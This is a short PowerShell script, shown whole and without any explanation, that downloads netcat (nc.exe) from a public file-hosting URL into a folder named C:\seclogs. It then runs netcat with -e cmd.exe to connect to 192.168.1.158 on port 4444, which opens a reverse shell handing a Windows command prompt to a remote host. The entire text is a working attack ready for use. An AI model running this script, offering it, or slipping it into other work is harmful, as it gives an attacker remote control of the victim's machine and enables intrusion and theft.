(New-Object net.webclient).DownloadFile("https://tmpfiles.org/download/46233/nc.exe", "C:\seclogs\nc.exe")
Start-Sleep -Seconds 5
C:\seclogs\nc.exe 192.168.1.158 4444 -e cmd.exe
